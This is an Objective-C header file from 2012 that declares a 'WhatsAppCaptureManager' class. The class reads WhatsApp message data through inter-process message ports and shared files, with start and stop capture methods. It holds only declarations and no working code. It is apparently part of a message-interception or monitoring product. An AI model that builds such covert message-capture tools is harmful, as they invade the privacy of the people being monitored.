/**
 - Project name :  WhatsAppCaptureManager 
 - Class name   :  WhatsAppCaptureManager.h
 - Version      :  1.0  
 - Purpose      :  For WhatsAppMessageCapture 
 - Copy right   :  28/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>

#import "MessagePortIPCReader.h"
#import "SharedFile2IPCReader.h"

#import "EventDelegate.h"

@interface WhatsAppCaptureManager : NSObject <MessagePortIPCDelegate, SharedFile2IPCDelegate> {
@private
	//MessagePortIPCReader	*mMessagePortReader;
	MessagePortIPCReader	*mMessagePortReader1;
	MessagePortIPCReader	*mMessagePortReader2;
	
	SharedFile2IPCReader	*mSharedFileReader1;
	
	id <EventDelegate>		mEventDelegate;
}

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate;

- (void) startCapture;
- (void) stopCapture;

@end
